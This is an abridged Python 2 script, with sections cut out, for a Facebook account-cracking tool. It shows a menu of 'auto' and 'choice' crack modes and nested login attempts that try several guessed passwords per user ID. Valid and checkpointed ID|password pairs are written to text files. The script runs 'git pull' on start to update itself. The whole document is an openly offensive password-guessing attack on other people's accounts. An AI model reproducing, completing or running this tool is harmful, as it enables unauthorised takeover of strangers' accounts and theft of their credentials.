...
__author__ = 'Sarkar Ranjha'
__copyright = 'All rights reserved . Copyright  Sarkar Ranjha'
...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m    Sarkar Ranjha        \n\x1b[1;92m   Sarkar Ranjha\n\x1b[1;91m   Sarkar Ranjha\n\x1b[1;91m   Sarkar Ranjha\n\x1b[1;97m   Sarkar Ranjha\xe2\x80\xa2   Sarkar Ranjha\n\x1b[1;97m   Sarkar Ranjha\n\x1b[1;94m   Sarkar Ranjha\n\x1b[1;94m  Sarkar Ranjha\n\x1b[1;93m   Sarkar Ranjha\n\x1b[1;93m  Sarkar Ranjha\n\x1b[1;96m   Sarkar Ranjha\n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Sarkar Ranjha\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/Sarkar845\n\x1b[1;97m\xe2\x9e\xa3 FB id: Commando\n\x1b[1;91m-----------------------------------------------'
...
def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Sarkar\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mSarkar Ranjha Latif\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[Ranjha-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/Ranjha_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[Sarkar-CP] ' + uid + ' | ' + pass1
                cp = open('Sarkar_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[Ranjha-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/Ranjha_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[Sarkar-CP] ' + uid + ' | ' + pass2
                    cp = open('Sarkar_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[Ranjha-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/Ranjha_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[Sarkar-CP] ' + uid + ' | ' + pass3
                        cp = open('Sarkar_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[Ranjha-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/Ranjha_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[Sarkar-CP] ' + uid + ' | ' + pass4
                            cp = open('Sarkar_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mSarkar Ranjha\x1b[1;91m'
    print 47 * '-'
